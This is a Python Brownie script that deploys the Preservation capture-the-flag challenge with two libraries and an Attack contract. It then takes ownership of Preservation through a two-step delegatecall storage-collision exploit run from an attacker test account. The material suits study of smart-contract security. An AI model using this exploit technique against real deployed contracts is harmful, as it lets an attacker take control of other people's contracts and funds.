from brownie import network, Preservation, LibraryContract, Attack
from scripts.helpful import get_account, LOCAL_NETWORKS
import web3


def deploy_preservation(account, address_one, address_two):
    publish = False
    if network.show_active() not in LOCAL_NETWORKS:
        publish = True
    contract = Preservation.deploy(
        address_one, address_two, {"from": account}, publish_source=publish
    )
    print(
        f"Cotntract --Preservation-- deployed at {contract.address} from {account.address}\n"
    )
    return contract


def deploy_library(account):
    publish = False
    if network.show_active() not in LOCAL_NETWORKS:
        publish = True
    contract = LibraryContract.deploy({"from": account}, publish_source=publish)
    print(
        f"Cotntract --LibraryContract-- deployed at {contract.address} from {account.address}\n"
    )
    return contract


def deploy_attack(account):
    publish = False
    if network.show_active() not in LOCAL_NETWORKS:
        publish = True
    contract = Attack.deploy({"from": account}, publish_source=publish)
    print(
        f"Cotntract --Attack-- deployed at {contract.address} from {account.address}\n"
    )
    return contract


def main():
    owner_account = get_account(0)
    attacker_account = get_account(1)
    contract_lib_one = deploy_library(owner_account)
    contract_lib_two = deploy_library(owner_account)
    contract_plreservation = deploy_preservation(
        owner_account, contract_lib_one.address, contract_lib_two.address
    )
    contract_attack = deploy_attack(attacker_account)
    print(f"Preservation owner: {contract_plreservation.owner()}")
    print(f"Preservation Lib 1: {contract_plreservation.timeZone1Library()}")
    print(f"Preservation Lib 2: {contract_plreservation.timeZone2Library()}")
    print("\n\n\n ATTACK 1")
    contract_plreservation.setFirstTime(
        contract_attack.address, {"from": attacker_account}
    )
    print(f"Preservation owner: {contract_plreservation.owner()}")
    print(f"Preservation Lib 1: {contract_plreservation.timeZone1Library()}")
    print(f"Preservation Lib 2: {contract_plreservation.timeZone2Library()}")
    print("\n\n\n ATTACK 2")
    contract_plreservation.setFirstTime(1653403843, {"from": attacker_account})
    print(f"Preservation owner: {contract_plreservation.owner()}")
    print(f"Preservation Lib 1: {contract_plreservation.timeZone1Library()}")
    print(f"Preservation Lib 2: {contract_plreservation.timeZone2Library()}")


if __name__ == "__main__":
    main()
